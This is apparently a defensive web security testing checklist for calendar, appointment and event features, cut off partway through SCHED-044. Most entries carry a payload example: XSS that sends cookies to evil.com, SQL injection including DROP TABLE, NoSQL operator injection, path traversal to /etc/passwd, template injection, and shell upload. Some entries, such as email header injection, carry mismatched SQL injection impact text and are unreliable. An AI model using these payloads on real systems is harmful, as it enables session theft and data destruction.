# 15. Scheduling & Booking — Checklist

Feature-area security **test cases** for “15. Scheduling & Booking”. Functionality-driven checklist mapped to the per-attack kits; impact-first with severity + CVSS.

*265 test cases. Source: expert checklist matrix (12/14-col). Payloads shown verbatim in code blocks.*

---

## SCHED-001 — Calendar IDOR Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Access own calendar 2. Intercept request 3. Modify calendar_id or user_id parameter 4. Access another user's calendar

**Expected Result:** Application should verify calendar ownership

**Payload Example:**

```
GET /api/calendars/victim_calendar_id or /calendar?user_id=victim_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-002 — Calendar Data IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. View calendar events 2. Modify organization_id parameter 3. Access another organization's calendar data 4. View competitor schedules

**Expected Result:** Calendar data should be tenant-scoped

**Payload Example:**

```
GET /api/calendar/events?org_id=victim_org_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-003 — Calendar XSS via Event Title
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Create event with XSS in title 2. View calendar 3. Event title renders 4. XSS executes

**Expected Result:** Event titles should be sanitized

**Payload Example:**

```
<script>document.location='http://evil.com/?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-004 — Calendar SQL Injection in Date Filter
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Apply date filter on calendar 2. Intercept request 3. Inject SQL in date parameter 4. Extract database data

**Expected Result:** Date parameters should be parameterized

**Payload Example:**

```
date_from=2024-01-01'; SELECT * FROM users--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-005 — Calendar NoSQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Filter calendar events 2. Inject NoSQL operators 3. Bypass filter restrictions 4. Access all events

**Expected Result:** NoSQL queries should be sanitized

**Payload Example:**

```
{"filter":{"$gt":"",user_id:{"$ne":null}}}
```

**Impact:** NoSQL operator injection -&gt; authentication bypass / cross-user data disclosure.

**Tools:** NoSQLMap / Burp Suite

**References:** CWE-943; -&gt;[NoSQL Injection checklist](#/checklist/nosqli); PortSwigger NoSQL injection

---

## SCHED-006 — Private Calendar Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Find private calendar URL 2. Access without authentication 3. View private events 4. Information disclosure

**Expected Result:** Private calendars should require authentication

**Payload Example:**

```
GET /calendars/private/victim_calendar_token
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-007 — Calendar Subscription Token Prediction
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Generate calendar subscription URL 2. Analyze token structure 3. Predict other tokens 4. Access others' calendars

**Expected Result:** Subscription tokens should be cryptographically random

**Payload Example:**

```
/calendars/ical/predictable_token_123.ics
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite Sequencer / Custom Scripts

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-008 — Calendar View Date Range Bypass
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. View calendar for allowed date range 2. Modify date parameters 3. Access historical or future data 4. Unauthorized data access

**Expected Result:** Date range access should be validated

**Payload Example:**

```
Access events outside subscription period
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-009 — Calendar Export IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Export own calendar 2. Modify calendar_id 3. Export another user's calendar 4. Data exfiltration

**Expected Result:** Export should verify ownership

**Payload Example:**

```
GET /api/calendars/victim_id/export
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-010 — Calendar ICS Injection
**Test Category:** Cross-Site Scripting · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Create event with malicious content 2. Export as ICS 3. Victim imports ICS 4. Malicious content executed

**Expected Result:** ICS content should be sanitized

**Payload Example:**

```
DESCRIPTION:Click here: javascript:alert(1)
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / ICS Tools

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-011 — Calendar Week/Month View Parameter Tampering
**Test Category:** Input Validation · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. View calendar with view parameter 2. Inject invalid view type 3. Application error 4. Information disclosure

**Expected Result:** View parameters should be whitelisted

**Payload Example:**

```
view=../../../etc/passwd or view=<script>
```

**Impact:** Improper input validation -&gt; downstream injection / logic abuse.

**Tools:** Burp Suite / Postman

**References:** CWE-20; -&gt;[XSS checklist](#/checklist/xss); OWASP Input Validation Cheat Sheet

---

## SCHED-012 — Calendar Shared View IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Access shared calendar 2. Modify share_id 3. Access other shared calendars 4. View unauthorized events

**Expected Result:** Shared access should verify permissions

**Payload Example:**

```
GET /api/shared-calendars/victim_share_id
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-013 — Calendar CSRF on View Settings
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Create malicious page 2. Auto-submit calendar settings change 3. User visits page 4. Calendar settings altered

**Expected Result:** Calendar operations should have CSRF protection

**Payload Example:**

```
<form action="/calendar/settings" method="POST"><input name="public" value="true"></form>
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SCHED-014 — Calendar Cache Poisoning
**Test Category:** Web Cache Poisoning · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Request calendar data 2. Inject via unkeyed headers 3. Poison cache 4. Serve malicious data to others

**Expected Result:** Calendar cache should be user-specific

**Payload Example:**

```
X-Forwarded-Host: evil.com in calendar request
```

**Impact:** Web cache poisoning/deception -&gt; mass XSS/redirect or private-data disclosure.

**Tools:** Burp Suite / Param Miner

**References:** CWE-524; -&gt;[Web Cache Poisoning checklist](#/checklist/webcache); James Kettle Web Cache Poisoning/Deception

---

## SCHED-015 — Calendar Real-time WebSocket IDOR
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Calendar View

**Test Steps:** 1. Connect to calendar WebSocket 2. Modify channel/subscription 3. Subscribe to others' updates 4. Monitor their calendar changes

**Expected Result:** WebSocket subscriptions should verify access

**Payload Example:**

```
Subscribe to channel: calendar_victim_user
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / WS King

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-016 — Appointment Booking IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Book appointment 2. Intercept request 3. Modify provider_id to access restricted provider 4. Book with unauthorized provider

**Expected Result:** Booking should verify provider availability to user

**Payload Example:**

```
POST /api/appointments {"provider_id":"restricted_provider"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-017 — Appointment Double Booking
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Select time slot 2. Submit multiple simultaneous bookings 3. Create overlapping appointments 4. Overbooking

**Expected Result:** Booking should prevent double booking atomically

**Payload Example:**

```
Parallel POST /api/appointments for same slot
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Turbo Intruder / Race-The-Web

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-018 — Appointment Price Manipulation
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Select service with price 2. Intercept booking request 3. Modify price parameter 4. Book at reduced price

**Expected Result:** Price should be server-calculated

**Payload Example:**

```
{"service_id":"premium",price:0.01}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-019 — Appointment Duration Manipulation
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Select appointment duration 2. Modify duration parameter 3. Get longer appointment 4. Resource abuse

**Expected Result:** Duration should be from service definition

**Payload Example:**

```
{"service_id":"30min",duration:180}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-020 — Appointment SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Search for available appointments 2. Inject SQL in search parameter 3. Extract database data 4. Access all appointments

**Expected Result:** Search should use parameterized queries

**Payload Example:**

```
search='; SELECT * FROM appointments--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-021 — Appointment Stored XSS in Notes
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Book appointment with XSS in notes 2. Provider views appointment 3. XSS executes 4. Session theft

**Expected Result:** Notes should be sanitized

**Payload Example:**

```
<script>stealSession()</script> in appointment notes
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-022 — Appointment User Impersonation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Book appointment 2. Modify customer_id 3. Book as another customer 4. Abuse their account

**Expected Result:** Customer ID should be from session

**Payload Example:**

```
{"customer_id":"victim_id",slot:"2024-01-01T10:00"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-023 — Past Date Appointment Booking
**Test Category:** Business Logic · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Select future date 2. Modify to past date 3. Create historical appointment 4. Data manipulation

**Expected Result:** Past dates should be rejected

**Payload Example:**

```
{"date":"2020-01-01",time:"10:00"}
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-024 — Appointment Booking Rate Limit Bypass
**Test Category:** Security Bypass · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Book appointments rapidly 2. Exceed booking limits 3. Reserve many slots 4. Denial of service to others

**Expected Result:** Booking rate should be limited

**Payload Example:**

```
100 booking requests per minute
```

**Impact:** Missing anti-automation/rate-limit -&gt; brute force, OTP/2FA guessing, resource-flood abuse.

**Tools:** Burp Suite / Custom Scripts

**References:** CWE-799; -&gt;[Account Takeover checklist](#/checklist/ato); OWASP WSTG-ATHN-04; PortSwigger

---

## SCHED-025 — Appointment Service ID Manipulation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Book regular service 2. Modify service_id to premium 3. Get premium service at regular price 4. Service theft

**Expected Result:** Service selection should be validated

**Payload Example:**

```
{"service_id":"premium_consultation",price:50}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-026 — Appointment Provider Private Slot Access
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. View provider's public slots 2. Enumerate slot IDs 3. Access private/blocked slots 4. Book restricted time

**Expected Result:** Private slots should not be bookable

**Payload Example:**

```
Book slot marked as provider personal time
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-027 — Appointment Guest Booking Authentication Bypass
**Test Category:** Broken Authentication · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Guest booking enabled 2. Modify guest flag 3. Access authenticated-only features 4. Privilege escalation

**Expected Result:** Guest vs authenticated should be enforced

**Payload Example:**

```
{"guest":false,user_id:"existing_user"}
```

**Impact:** Broken auth in this flow -&gt; account takeover of any user (bypass/replay/reset/2FA defeat).

**Tools:** Burp Suite / Postman

**References:** CWE-640; -&gt;[Account Takeover checklist](#/checklist/ato); PortSwigger Authentication; disclosed ATO writeups

---

## SCHED-028 — Appointment Confirmation Email Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Book appointment 2. Inject headers in email field 3. Send spam via confirmation 4. Reputation damage

**Expected Result:** Email fields should be sanitized

**Payload Example:**

```
email=victim@test.com%0ABcc:spam@evil.com
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Email Analysis

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-029 — Appointment CSRF
**Test Category:** Cross-Site Request Forgery · **Severity:** Medium · **CVSS:** 6.1 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Create malicious page 2. Auto-submit booking 3. User visits page 4. Appointment booked without consent

**Expected Result:** Booking should require CSRF token

**Payload Example:**

```
<form action="/appointments/book" method="POST">
```

**Impact:** CSRF on a state-changing action -&gt; forced account/settings change, chainable to ATO.

**Tools:** Burp Suite CSRF PoC / Custom HTML

**References:** CWE-352; -&gt;[CSRF checklist](#/checklist/csrf); PortSwigger CSRF + SameSite

---

## SCHED-030 — Appointment Payment Bypass
**Test Category:** Business Logic · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Appointment Booking

**Test Steps:** 1. Book paid appointment 2. Intercept payment callback 3. Modify to success 4. Free appointment

**Expected Result:** Payment should be verified server-side

**Payload Example:**

```
Modify payment_status to confirmed without payment
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Postman

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-031 — Event Creation IDOR
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event 2. Modify calendar_id 3. Create event in another user's calendar 4. Calendar hijacking

**Expected Result:** Event creation should verify calendar ownership

**Payload Example:**

```
POST /api/events {"calendar_id":"victim_calendar_id"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-032 — Event Stored XSS in Title
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event with XSS in title 2. Event displayed on calendar 3. Victim views calendar 4. XSS executes

**Expected Result:** Event titles should be sanitized

**Payload Example:**

```
<img src=x onerror=alert(document.cookie)>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-033 — Event Stored XSS in Description
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event with XSS in description 2. Event details viewed 3. Description renders 4. Script executes

**Expected Result:** Descriptions should be sanitized

**Payload Example:**

```
<script>document.location='http://evil.com?c='+document.cookie</script>
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-034 — Event Stored XSS in Location
**Test Category:** Cross-Site Scripting · **Severity:** High · **CVSS:** 8.2 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Set event location with XSS 2. Location displayed 3. XSS renders 4. Script executes

**Expected Result:** Location field should be sanitized

**Payload Example:**

```
<svg onload=alert('XSS')> as location
```

**Impact:** Stored/reflected XSS in this feature -&gt; session/token theft, cross-user account compromise.

**Tools:** Burp Suite / XSS Hunter

**References:** CWE-79; -&gt;[XSS checklist](#/checklist/xss); PortSwigger XSS; Cure53

---

## SCHED-035 — Event SQL Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event with SQL in fields 2. Event saved 3. SQL executed during query 4. Data breach

**Expected Result:** Event fields should be parameterized

**Payload Example:**

```
title='; DROP TABLE events;--
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** SQLMap / Burp Suite

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-036 — Event Template Injection
**Test Category:** Injection · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event with template syntax 2. Event renders 3. Template executes 4. Code execution

**Expected Result:** Event content should not be templated

**Payload Example:**

```
{{7*7}} or ${constructor.constructor('return this')()}
```

**Impact:** Server-side template injection -&gt; remote code execution on the app server.

**Tools:** Burp Suite / Tplmap

**References:** CWE-1336; -&gt;[SSTI checklist](#/checklist/ssti); PortSwigger SSTI (James Kettle)

---

## SCHED-037 — Event Mass Assignment
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event 2. Add extra parameters 3. Modify restricted fields 4. Bypass access controls

**Expected Result:** Only allowed fields should be accepted

**Payload Example:**

```
{"title":"test",owner_id:"admin",is_system:true}
```

**Impact:** Mass assignment / parameter pollution -&gt; privilege escalation (role/isAdmin/isVerified) or ownership takeover.

**Tools:** Burp Suite / Postman / Arjun

**References:** CWE-915; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Mass assignment; OWASP API3 BOPLA

---

## SCHED-038 — Event Attendee Injection
**Test Category:** Broken Access Control · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event with attendees 2. Add unauthorized attendees 3. Notify non-consenting users 4. Spam

**Expected Result:** Attendees should be validated

**Payload Example:**

```
{"attendees":["anyone@email.com",admin@company.com]}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-039 — Event Attachment Upload Vulnerability
**Test Category:** File Upload Vulnerabilities · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event with attachment 2. Upload malicious file 3. File processed 4. Code execution

**Expected Result:** Attachments should be validated

**Payload Example:**

```
Upload shell.php as event attachment
```

**Impact:** Malicious file upload -&gt; RCE / stored XSS / parser XXE depending on handling.

**Tools:** Burp Suite / Upload Scanner

**References:** CWE-434; -&gt;[File Upload checklist](#/checklist/fileupload); PortSwigger File upload; ImageTragick

---

## SCHED-040 — Event Private Access Bypass
**Test Category:** Broken Access Control · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create private event 2. Access via direct URL 3. View private details 4. Information disclosure

**Expected Result:** Private events should verify access

**Payload Example:**

```
GET /api/events/private_event_id without authorization
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman / Autorize

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-041 — Event Recurrence Rule Injection
**Test Category:** Injection · **Severity:** Medium · **CVSS:** 5.3 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create recurring event 2. Inject malicious RRULE 3. Rule processed 4. System manipulation

**Expected Result:** Recurrence rules should be validated

**Payload Example:**

```
RRULE:FREQ=DAILY;COUNT=999999999
```

**Impact:** SQL injection at this feature boundary -&gt; auth bypass / full DB read-write / data breach (and RCE on some stacks).

**Tools:** Burp Suite / Postman

**References:** CWE-89; -&gt;[SQL Injection checklist](#/checklist/sqli); PortSwigger SQLi; PayloadsAllTheThings

---

## SCHED-042 — Event Cross-Calendar Creation
**Test Category:** Broken Access Control · **Severity:** Critical · **CVSS:** 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event specifying calendar 2. Modify to different organization's calendar 3. Cross-tenant access 4. Data breach

**Expected Result:** Calendar creation should be tenant-scoped

**Payload Example:**

```
{"calendar_id":"competitor_calendar"}
```

**Impact:** IDOR/BOLA on this object -&gt; cross-user read/modify, data breach at scale.

**Tools:** Burp Suite / Postman

**References:** CWE-639; -&gt;[IDOR / BOLA checklist](#/checklist/idor); PortSwigger Access Control; OWASP API1 BOLA

---

## SCHED-043 — Event Duplicate Detection Bypass
**Test Category:** Business Logic · **Severity:** Low · **CVSS:** 3.7 (CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:N/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event 2. Create identical event 3. Bypass duplicate detection 4. Resource waste

**Expected Result:** Duplicates should be detected

**Payload Example:**

```
Create same event with slightly modified timestamp
```

**Impact:** Business-logic flaw in this flow -&gt; control bypass with security or financial impact.

**Tools:** Burp Suite / Manual Testing

**References:** CWE-840; PortSwigger Business logic

---

## SCHED-044 — Event Organizer Spoofing
**Test Category:** Business Logic · **Severity:** High · **CVSS:** 8.1 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N)

**Where to Test / Injection Point:** Event Creation

**Test Steps:** 1. Create event 2. Modify organizer field 3. Impersonate another user 4. Social engineering

**Expected Result:** Organizer should be from session

**Payload Example:**

```
